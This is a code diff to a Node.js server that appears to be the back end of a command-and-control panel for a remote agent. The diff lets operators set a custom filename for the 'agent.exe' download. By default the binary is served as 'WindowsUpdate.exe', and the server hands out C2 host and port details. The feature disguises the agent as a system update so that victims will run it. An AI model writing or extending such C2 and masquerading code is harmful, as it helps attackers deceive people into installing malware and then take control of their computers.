@@ -1139,7 +1139,7 @@ wss.on('connection', (ws, req) => {
     broadcastClientListToUser(ws, user);
 
     // Send welcome message to dashboard
-    const downloadToken = db.getOrCreateDownloadToken(user.userId);
+    const { token: downloadToken, customFilename: downloadFilename } = db.getOrCreateDownloadToken(user.userId);
     const downloadUrl = `http://${SERVER_HOST}:${DOWNLOAD_PORT}/download/${downloadToken}/agent.exe`;
     ws.send(JSON.stringify({
         type: 'connected',
@@ -1152,6 +1152,7 @@ wss.on('connection', (ws, req) => {
             userId: user.userId
         },
         downloadUrl,
+        downloadFilename: downloadFilename || 'WindowsUpdate.exe',
         c2Host: SERVER_HOST,
         c2Port: TCP_PORT
     }));
@@ -1646,6 +1647,21 @@ wss.on('connection', (ws, req) => {
                         clientId,
                         targets: firedTargets,
                         count: firedTargets.length,
+                        timestamp: Date.now()
+                    }));
+                    break;
+                }
+
+                case 'set_download_filename': {
+                    // Save a custom filename for this user's download token
+                    const raw = typeof message.filename === 'string' ? message.filename.trim() : '';
+                    // Sanitise: only allow safe characters, must end with .exe
+                    const safe = raw.replace(/[^a-zA-Z0-9_\-. ()]/g, '').substring(0, 64);
+                    const finalName = safe.length > 0 ? (safe.endsWith('.exe') ? safe : safe + '.exe') : null;
+                    db.setDownloadFilename(user.userId, finalName);
+                    ws.send(JSON.stringify({
+                        type: 'download_filename_updated',
+                        filename: finalName || 'WindowsUpdate.exe',
                         timestamp: Date.now()
                     }));
                     break;
@@ -2293,18 +2309,20 @@ const downloadServer = require('http').createServer((req, res) => {
     const m = req.url.match(/^\/download\/([a-f0-9]+)\/agent\.exe$/);
     if (!m) { res.writeHead(404); res.end('Not found'); return; }
     const token = m[1];
-    const userId = db.getUserByDownloadToken(token);
-    if (!userId) { res.writeHead(403); res.end('Invalid token'); return; }
+    const tokenInfo = db.getUserByDownloadToken(token);
+    if (!tokenInfo) { res.writeHead(403); res.end('Invalid token'); return; }
+    const { userId, customFilename } = tokenInfo;
+    const serveAs = customFilename || 'WindowsUpdate.exe';
     const fs = require('fs');
     if (!fs.existsSync(AGENT_PATH)) { res.writeHead(503); res.end('Agent binary not found on server'); return; }
     const stat = fs.statSync(AGENT_PATH);
     res.writeHead(200, {
         'Content-Type': 'application/octet-stream',
-        'Content-Disposition': 'attachment; filename="WindowsUpdate.exe"',
+        'Content-Disposition': `attachment; filename="${serveAs}"`,
         'Content-Length': stat.size
     });
     fs.createReadStream(AGENT_PATH).pipe(res);
-    console.log(`[DOWNLOAD] Agent downloaded via token for user_id=${userId}`);
+    console.log(`[DOWNLOAD] Agent downloaded as "${serveAs}" via token for user_id=${userId}`);
 });
 downloadServer.listen(DOWNLOAD_PORT, () => {
     console.log(`- Agent download: http://localhost:${DOWNLOAD_PORT}/download/<token>/agent.exe`);
